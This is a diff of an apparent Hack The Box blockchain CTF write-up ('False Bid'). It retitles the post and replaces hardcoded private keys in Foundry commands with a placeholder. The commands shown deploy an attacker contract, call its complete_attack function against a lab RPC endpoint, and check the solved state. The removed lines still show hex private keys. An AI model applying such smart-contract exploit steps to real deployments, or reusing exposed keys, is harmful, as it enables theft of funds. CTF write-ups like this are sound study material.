@@ -1,7 +1,8 @@
 ---
-title: HTB Blockchain Challenge - Honor Among Thieves
+title: HTB Blockchain Challenge - False Bid
 date: {{ date }}
 cover   : "/img/htb2.jpeg"
+tags: Blockchain SmartContract Exploit
 ---
 
 False Bidding
@@ -256,10 +257,9 @@ contract Attacker{
 ```
 
 * deploy contract
-
-    * `forge create src/Attacker.sol:Attacker --rpc-url http://159.65.20.166:32026/rpc --private-key "0x7930daf7ca98a69e54ff9d3e68edbb2ac204a2643a7bfbcd7f69cae82e2549b9" --value 25ether --constructor-args "0x5557a3c564A9D35F2c3CCc3bC53Fc2617b117f64"`
+    * `forge create src/Attacker.sol:Attacker --rpc-url http://159.65.20.166:32026/rpc --private-key {{private key}} --value 25ether --constructor-args "0x5557a3c564A9D35F2c3CCc3bC53Fc2617b117f64"`
 * Exploit
-    * `cast send  --rpc-url http://159.65.20.166:32026/rpc --private-key "0x7930daf7ca98a69e54ff9d3e68edbb2ac204a2643a7bfbcd7f69cae82e2549b9" 0x7828aF85c4C0638419a9e0564Ec7942A197bf279 "complete_attack(address)" 0x57Eea081F89f3924F8c429D0D5f4b4B53317dA62`
+    * `cast send  --rpc-url http://159.65.20.166:32026/rpc --private-key {{private key}} 0x7828aF85c4C0638419a9e0564Ec7942A197bf279 "complete_attack(address)" 0x57Eea081F89f3924F8c429D0D5f4b4B53317dA62`
 * Check is solved
-    * `cast call  --rpc-url http://159.65.20.166:32026/rpc --private-key "0xa01a048465d3fed6bb024f825a826dbc17f4af6110959a575d0c733f342e063d" 0x5557a3c564A9D35F2c3CCc3bC53Fc2617b117f64 "isSolved(address)"  0x57Eea081F89f3924F8c429D0D5f4b4B53317dA62`
+    * `cast call  --rpc-url http://159.65.20.166:32026/rpc --private-key {{private key}} 0x5557a3c564A9D35F2c3CCc3bC53Fc2617b117f64 "isSolved(address)"  0x57Eea081F89f3924F8c429D0D5f4b4B53317dA62`
 
